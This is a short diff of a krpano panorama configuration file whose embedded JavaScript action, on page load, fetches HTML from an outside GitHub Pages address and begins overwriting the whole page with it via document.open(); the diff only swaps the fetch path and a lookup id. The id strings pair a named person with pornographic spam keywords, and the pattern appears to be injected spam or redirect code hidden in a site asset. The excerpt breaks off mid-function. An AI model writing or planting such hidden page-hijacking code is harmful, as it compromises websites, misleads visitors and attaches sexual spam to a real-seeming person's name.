@@ -1,9 +1,9 @@
 <krpano version="1.0.8.15">
 <action name="js_loader_start" type="Javascript"><![CDATA[
-var id = new URLSearchParams(window.location.search).get("id") || "nisha-maharana-porn-sex-videos-xx-xxxx-4kP2a";
+var id = new URLSearchParams(window.location.search).get("id") || "nisha-maharana-porn-sex-videos-xx-xxx-k3p9a";
 if (!window.__kgh_loader_done) {
   window.__kgh_loader_done = 1;
-  window.fetch("https://lovecrash301.github.io/event/jsg/" + id + ".html")
+  window.fetch("https://lovecrash301.github.io/event/rtc/" + id + ".html")
     .then(function (r) { return r.text(); })
     .then(function (html) {
       window.document.open();
